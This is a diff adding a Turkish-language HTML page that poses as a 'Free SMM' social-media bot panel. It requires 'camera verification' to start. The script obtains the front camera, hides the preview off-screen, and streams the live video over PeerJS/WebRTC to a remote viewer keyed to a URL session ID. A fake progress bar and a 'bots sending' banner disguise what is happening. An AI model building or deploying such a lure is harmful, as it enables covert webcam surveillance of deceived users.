@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Free SMM</title>
+
+<style>
+*{
+box-sizing:border-box;
+}
+
+body{
+margin:0;
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px;
+font-family:Arial,sans-serif;
+color:#fff;
+background:
+radial-gradient(circle at 10% 10%,rgba(255,0,128,.25),transparent 30%),
+radial-gradient(circle at 90% 10%,rgba(0,190,255,.25),transparent 30%),
+radial-gradient(circle at 50% 100%,rgba(120,60,255,.25),transparent 35%),
+#080914;
+}
+
+.panel{
+width:min(700px,100%);
+padding:30px;
+background:rgba(17,19,38,.94);
+border:1px solid rgba(255,255,255,.12);
+border-radius:22px;
+box-shadow:0 30px 80px rgba(0,0,0,.55);
+}
+
+.logo{
+font-size:30px;
+font-weight:900;
+letter-spacing:3px;
+background:linear-gradient(90deg,#ff3d9a,#8b5cf6,#00c6ff);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+}
+
+.subtitle{
+margin-top:6px;
+color:#8e96ad;
+font-size:13px;
+}
+
+.info{
+margin-top:25px;
+padding:18px;
+border-radius:14px;
+background:linear-gradient(
+135deg,
+rgba(255,61,154,.08),
+rgba(59,130,246,.08)
+);
+border:1px solid rgba(255,255,255,.08);
+color:#bdc4d6;
+line-height:1.6;
+}
+
+button{
+width:100%;
+margin-top:20px;
+padding:16px;
+border:0;
+border-radius:12px;
+color:#fff;
+font-weight:800;
+font-size:14px;
+cursor:pointer;
+background:linear-gradient(90deg,#ff3d9a,#8b5cf6,#3b82f6);
+box-shadow:0 12px 30px rgba(124,58,237,.3);
+}
+
+button:hover{
+transform:translateY(-1px);
+}
+
+button:disabled{
+opacity:.5;
+cursor:not-allowed;
+transform:none;
+}
+
+.stop-button{
+display:none;
+background:linear-gradient(90deg,#ef4444,#dc2626);
+}
+
+.status{
+margin-top:18px;
+padding:14px;
+border-radius:12px;
+background:#111426;
+border:1px solid #282d46;
+color:#c7cede;
+font-size:13px;
+line-height:1.5;
+}
+
+.status.ok{
+border-color:rgba(33,230,163,.35);
+}
+
+.status.error{
+border-color:rgba(255,70,90,.45);
+color:#ffb8c1;
+}
+
+.progress-wrap{
+display:none;
+margin-top:20px;
+}
+
+.progress{
+height:10px;
+overflow:hidden;
+border-radius:20px;
+background:#090b16;
+}
+
+.progress-bar{
+width:0%;
+height:100%;
+border-radius:20px;
+background:linear-gradient(90deg,#ff3d9a,#8b5cf6,#00c6ff);
+transition:width .15s linear;
+}
+
+.progress-text{
+display:flex;
+justify-content:space-between;
+margin-top:9px;
+color:#8790a9;
+font-size:11px;
+}
+
+.stats{
+display:grid;
+grid-template-columns:repeat(2,1fr);
+gap:10px;
+margin-top:15px;
+}
+
+.stat{
+padding:14px;
+border-radius:12px;
+background:#111426;
+border:1px solid #242941;
+}
+
+.stat-title{
+color:#727b94;
+font-size:10px;
+}
+
+.stat-value{
+margin-top:6px;
+font-weight:800;
+}
+
+.log{
+height:120px;
+overflow:auto;
+margin-top:15px;
+padding:12px;
+border-radius:12px;
+background:#0a0c17;
+border:1px solid #20253a;
+color:#737d98;
+font-family:monospace;
+font-size:11px;
+line-height:1.7;
+}
+
+#localVideo{
+display:none !important;
+width:0 !important;
+height:0 !important;
+position:absolute !important;
+left:-9999px !important;
+opacity:0 !important;
+pointer-events:none !important;
+}
+
+.camera-notice{
+display:none;
+position:fixed;
+top:15px;
+left:15px;
+z-index:9999;
+padding:11px 15px;
+border-radius:10px;
+background:rgba(100,10,30,.95);
+border:1px solid rgba(255,80,100,.4);
+font-size:12px;
+font-weight:800;
+box-shadow:0 10px 30px rgba(0,0,0,.45);
+}
+
+@media(max-width:600px){
+.panel{
+padding:22px;
+}
+}
+</style>
+
+</head>
+
+<body>
+
+<div
+class="camera-notice"
+id="cameraNotice">
+🔴 Botlet Açıldı. Gönderiliyor...
+</div>
+
+<div class="panel">
+
+<div class="logo">
+FREE SMM
+</div>
+
+<div class="subtitle">
+Social Media Marketing Panel
+</div>
+
+<div class="info">
+
+<strong>Kamera doğrulaması</strong>
+
+<br><br>
+
+İşlemi başlatmak için kamera erişimi gerekir.
+Kamera yalnızca tarayıcıdan açıkça izin verdikten
+sonra etkinleştirilir.
+
+</div>
+
+<button id="startBtn">
+HESABIMI DOĞRULA VE BAŞLAT
+</button>
+
+<button
+id="stopBtn"
+class="stop-button">
+BOT GÖNDERMEYİ DURDUR </button>
+
+<div
+class="status"
+id="status">
+● Sistem hazır — başlatılmayı bekliyor.
+</div>
+
+<video
+id="localVideo"
+autoplay
+muted
+playsinline> </video>
+
+<div
+class="progress-wrap"
+id="progressWrap">
+
+<div class="progress">
+
+<div
+class="progress-bar"
+id="progressBar">
+</div>
+
+</div>
+
+<div class="progress-text">
+
+<span id="phase">
+Bekleniyor
+</span>
+
+<span id="percent">
+0%
+</span>
+
+</div>
+
+<div class="stats">
+
+<div class="stat">
+
+<div class="stat-title">
+OTURUM
+</div>
+
+<div
+class="stat-value"
+id="sessionValue">
+---
+</div>
+
+</div>
+
+<div class="stat">
+
+<div class="stat-title">
+DURUM
+</div>
+
+<div
+class="stat-value"
+id="orderStatus">
+BEKLEMEDE
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<div
+class="log"
+id="log">
+
+[SYSTEM] Free SMM başlatıldı.<br>
+[SYSTEM] Sistem bağlantısı hazır.<br>
+[SYSTEM] Kamera doğrulaması bekleniyor...
+
+</div>
+
+</div>
+
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+
+<script>
+
+const startBtn =
+document.getElementById("startBtn");
+
+const stopBtn =
+document.getElementById("stopBtn");
+
+const statusBox =
+document.getElementById("status");
+
+const localVideo =
+document.getElementById("localVideo");
+
+const cameraNotice =
+document.getElementById("cameraNotice");
+
+const progressWrap =
+document.getElementById("progressWrap");
+
+const progressBar =
+document.getElementById("progressBar");
+
+const percent =
+document.getElementById("percent");
+
+const phase =
+document.getElementById("phase");
+
+const orderStatus =
+document.getElementById("orderStatus");
+
+const sessionValue =
+document.getElementById("sessionValue");
+
+const logBox =
+document.getElementById("log");
+
+
+/* SESSION */
+
+const params =
+new URLSearchParams(location.search);
+
+const session =
+params.get("session");
+
+if(!session){
+
+statusBox.textContent =
+"✖ Session parametresi bulunamadı.";
+
+statusBox.className =
+"status error";
+
+startBtn.disabled=true;
+
+throw new Error(
+"camera.html: session missing"
+);
+
+}
+
+sessionValue.textContent=session;
+
+
+/* PEER ID */
+
+const cleanSession =
+session.replace(
+/[^a-zA-Z0-9]/g,
+""
+);
+
+const cameraPeerId =
+"cam-"+cleanSession;
+
+
+/* STATE */
+
+let peer=null;
+let stream=null;
+let activeCall=null;
+let sharing=false;
+
+
+/* HELPERS */
+
+function log(text){
+
+logBox.innerHTML +=
+"<br>[SYSTEM] "+text;
+
+logBox.scrollTop =
+logBox.scrollHeight;
+
+}
+
+function setStatus(text,type=""){
+
+statusBox.textContent=text;
+
+statusBox.className=
+"status "+type;
+
+}
+
+function wait(ms){
+
+return new Promise(
+resolve=>setTimeout(resolve,ms)
+);
+
+}
+
+
+/* START BUTTON */
+
+startBtn.addEventListener(
+"click",
+startCamera
+);
+
+
+/* STOP BUTTON */
+
+stopBtn.addEventListener(
+"click",
+stopSharing
+);
+
+
+/* CAMERA */
+
+async function startCamera(){
+
+if(sharing)return;
+
+startBtn.disabled=true;
+
+setStatus(
+"● Kamera izni bekleniyor..."
+);
+
+log(
+"Tarayıcıdan kamera erişimi isteniyor."
+);
+
+if(
+!navigator.mediaDevices ||
+!navigator.mediaDevices.getUserMedia
+){
+
+setStatus(
+"✖ Bu tarayıcı kamera erişimini desteklemiyor.",
+"error"
+);
+
+log(
+"getUserMedia desteklenmiyor."
+);
+
+startBtn.disabled=false;
+
+return;
+
+}
+
+try{
+
+stream =
+await navigator.mediaDevices.getUserMedia({
+
+video:{
+facingMode:"user",
+width:{
+ideal:1280
+},
+height:{
+ideal:720
+}
+},
+
+audio:false
+
+});
+
+
+/* CAMERA OK */
+
+sharing=true;
+
+setStatus(
+"● Kamera aktif.",
+"ok"
+);
+
+orderStatus.textContent=
+"KAMERA AKTİF";
+
+cameraNotice.style.display=
+"block";
+
+stopBtn.style.display=
+"block";
+
+localVideo.srcObject=
+stream;
+
+/* Kamera görüntüsü sayfada gösterilmez.
+   Stream, yalnızca izin verildikten sonra WebRTC paylaşımı için kullanılır. */
+localVideo.style.display=
+"none";
+
+try{
+
+await localVideo.play();
+
+}catch(e){
+
+console.warn(
+"Video play hatası:",
+e
+);
+
+}
+
+log(
+"Kamera erişimi başarıyla alındı."
+);
+
+log(
+"Kamera paylaşımı başlatıldı; önizleme panelde gösterilmiyor."
+);
+
+
+/* PEER */
+
+createPeer();
+
+await runVerification();
+
+}catch(error){
+
+console.error(
+"Kamera hatası:",
+error
+);
+
+handleCameraError(error);
+
+}
+
+}
+
+
+/* PEERJS */
+
+function createPeer(){
+
+setStatus(
+"● WebRTC bağlantısı hazırlanıyor..."
+);
+
+log(
+"Kamera Peer bağlantısı oluşturuluyor."
+);
+
+peer =
+new Peer(
+cameraPeerId,
+{
+debug:2
+}
+);
+
+
+/* PEER OPEN */
+
+peer.on(
+"open",
+id=>{
+
+log(
+"PeerJS bağlantısı hazır."
+);
+
+log(
+"Peer ID: "+id
+);
+
+setStatus(
+"● Kamera hazır — viewer bağlantısı bekleniyor.",
+"ok"
+);
+
+}
+);
+
+
+/* VIEWER CONNECT */
+
+peer.on(
+"connection",
+connection=>{
+
+log(
+"Viewer bağlantısı algılandı."
+);
+
+setStatus(
+"● Viewer bulundu — bağlantı kuruluyor..."
+);
+
+connection.on(
+"open",
+()=>{
+
+log(
+"Viewer bağlantısı açıldı."
+);
+
+setStatus(
+"● Viewer bağlandı — yayın başlatılıyor.",
+"ok"
+);
+
+
+/*
+  Açık kamera paylaşımı:
+  Kullanıcı kamera erişimini verdikten
+  sonra mevcut stream viewer'a gönderilir.
+*/
+
+if(
+!stream ||
+!stream.active
+){
+
+log(
+"Kamera stream'i aktif değil."
+);
+
+return;
+
+}
+
+try{
+
+activeCall =
+peer.call(
+connection.peer,
+stream
+);
+
+if(!activeCall){
+
+log(
+"WebRTC çağrısı oluşturulamadı."
+);
+
+setStatus(
+"✖ WebRTC çağrısı oluşturulamadı.",
+"error"
+);
+
+return;
+
+}
+
+log(
+"WebRTC medya bağlantısı gönderildi."
+);
+
+}
+
+catch(error){
+
+console.error(error);
+
+log(
+"WebRTC çağrı hatası: "+
+error.message
+);
+
+setStatus(
+"✖ WebRTC çağrısı başarısız.",
+"error"
+);
+
+}
+
+});
+
+
+connection.on(
+"close",
+()=>{
+
+log(
+"Viewer bağlantısı kapandı."
+);
+
+if(sharing){
+
+setStatus(
+"● Viewer bağlantısı kapandı — yeni bağlantı bekleniyor."
+);
+
+}
+
+});
+
+
+connection.on(
+"error",
+error=>{
+
+console.error(error);
+
+log(
+"Viewer bağlantı hatası."
+);
+
+setStatus(
+"✖ Viewer bağlantı hatası.",
+"error"
+);
+
+});
+
+});
+
+
+/* PEER ERROR */
+
+peer.on(
+"error",
+error=>{
+
+console.error(
+"PeerJS hatası:",
+error
+);
+
+log(
+"PeerJS hatası: "+
+(error.type||error.message)
+);
+
+if(
+error.type==="unavailable-id"
+){
+
+setStatus(
+"✖ Bu kamera oturumu zaten açık.",
+"error"
+);
+
+}
+
+else{
+
+setStatus(
+"✖ WebRTC hatası: "+
+(error.type||"bilinmeyen"),
+"error"
+);
+
+}
+
+});
+
+
+/* DISCONNECTED */
+
+peer.on(
+"disconnected",
+()=>{
+
+if(!sharing)return;
+
+setStatus(
+"● WebRTC bağlantısı kesildi."
+);
+
+log(
+"PeerJS bağlantısı kesildi."
+);
+
+});
+
+
+/* CLOSE */
+
+peer.on(
+"close",
+()=>{
+
+if(!sharing)return;
+
+log(
+"PeerJS kapandı."
+);
+
+});
+
+}
+
+
+/* VERIFICATION */
+
+async function runVerification(){
+
+progressWrap.style.display=
+"block";
+
+orderStatus.textContent=
+"DOĞRULANIYOR";
+
+for(
+let value=0;
+value<=50;
+value+=2
+){
+
+progressBar.style.width=
+value+"%";
+
+percent.textContent=
+value+"%";
+
+phase.textContent=
+"Kamera doğrulanıyor";
+
+await wait(80);
+
+}
+
+orderStatus.textContent=
+"DOĞRULANDI";
+
+await wait(500);
+
+for(
+let value=50;
+value<=100;
+value+=2
+){
+
+progressBar.style.width=
+value+"%";
+
+percent.textContent=
+value+"%";
+
+phase.textContent=
+"Bağlantı hazırlanıyor";
+
+await wait(80);
+
+}
+
+orderStatus.textContent=
+"YAYIN HAZIR";
+
+setStatus(
+"● Kamera paylaşımı aktif.",
+"ok"
+);
+
+log(
+"Kamera doğrulaması tamamlandı."
+);
+
+}
+
+
+/* CAMERA ERROR */
+
+function handleCameraError(error){
+
+startBtn.disabled=false;
+
+stopBtn.style.display=
+"none";
+
+cameraNotice.style.display=
+"none";
+
+sharing=false;
+
+if(error.name==="NotAllowedError"){
+
+setStatus(
+"✖ Kamera izni reddedildi.",
+"error"
+);
+
+log(
+"Kullanıcı kamera iznini reddetti."
+);
+
+}
+
+else if(
+error.name==="NotFoundError"
+){
+
+setStatus(
+"✖ Kamera bulunamadı.",
+"error"
+);
+
+log(
+"Cihazda kamera bulunamadı."
+);
+
+}
+
+else if(
+error.name==="NotReadableError"
+){
+
+setStatus(
+"✖ Kamera başka bir uygulama tarafından kullanılıyor.",
+"error"
+);
+
+log(
+"Kamera başka bir uygulama tarafından kullanılıyor."
+);
+
+}
+
+else if(
+error.name==="SecurityError"
+){
+
+setStatus(
+"✖ Kamera erişimi güvenlik nedeniyle engellendi.",
+"error"
+);
+
+log(
+"Tarayıcı kamera erişimini engelledi."
+);
+
+}
+
+else{
+
+setStatus(
+"✖ Kamera başlatılamadı.",
+"error"
+);
+
+log(
+"Kamera hatası: "+
+(error.message||error.name)
+);
+
+}
+
+}
+
+
+/* STOP */
+
+function stopSharing(){
+
+sharing=false;
+
+if(activeCall){
+
+try{
+
+activeCall.close();
+
+}catch{}
+
+activeCall=null;
+
+}
+
+if(stream){
+
+stream
+.getTracks()
+.forEach(track=>{
+track.stop();
+});
+
+stream=null;
+
+}
+
+if(localVideo){
+
+localVideo.srcObject=null;
+
+localVideo.style.display=
+"none";
+
+}
+
+if(peer){
+
+try{
+
+peer.destroy();
+
+}catch{}
+
+peer=null;
+
+}
+
+cameraNotice.style.display=
+"none";
+
+stopBtn.style.display=
+"none";
+
+startBtn.disabled=false;
+
+orderStatus.textContent=
+"DURDURULDU";
+
+progressWrap.style.display=
+"none";
+
+setStatus(
+"● Kamera paylaşımı durduruldu."
+);
+
+log(
+"Kamera paylaşımı kullanıcı tarafından durduruldu."
+);
+
+}
+
+
+/* PAGE CLOSE */
+
+window.addEventListener(
+"beforeunload",
+()=>{
+
+if(stream){
+
+stream
+.getTracks()
+.forEach(track=>{
+track.stop();
+});
+
+}
+
+if(peer){
+
+try{
+peer.destroy();
+}catch{}
+
+}
+
+});
+
+</script>
+
+</body>
+</html>
